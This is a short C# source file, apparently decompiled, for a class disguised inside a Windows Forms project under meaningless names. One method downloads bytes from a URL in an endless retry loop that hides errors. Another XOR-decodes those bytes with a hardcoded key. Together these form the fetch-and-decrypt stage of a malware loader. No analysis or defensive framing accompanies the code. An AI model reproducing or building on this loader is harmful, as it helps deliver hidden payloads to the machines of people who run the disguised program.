using System.Net;
using System.Text;

namespace WindowsFormsApp43;

internal class MapperWriter
{
	internal static MapperWriter VerifySingleton;

	internal static byte[] WriteEvent(string reference)
	{
		byte[] array = null;
		while (true)
		{
			try
			{
				using WebClient webClient = new WebClient();
				return webClient.DownloadData(reference);
			}
			catch
			{
			}
		}
	}

	internal static byte[] SortEvent(byte[] spec)
	{
		string s = "Zxtzomtwdhnjqrtqtabgkz";
		byte[] bytes = ((Encoding)FlushSingleton()).GetBytes(s);
		byte[] array = new byte[spec.Length];
		for (int i = 0; i < spec.Length; i++)
		{
			array[i] = (byte)(bytes[i % bytes.Length] ^ spec[i]);
		}
		return array;
	}

	internal static bool ExcludeSingleton()
	{
		return VerifySingleton == null;
	}

	internal static MapperWriter RemoveSingleton()
	{
		return VerifySingleton;
	}

	internal static object FlushSingleton()
	{
		return Encoding.ASCII;
	}
}
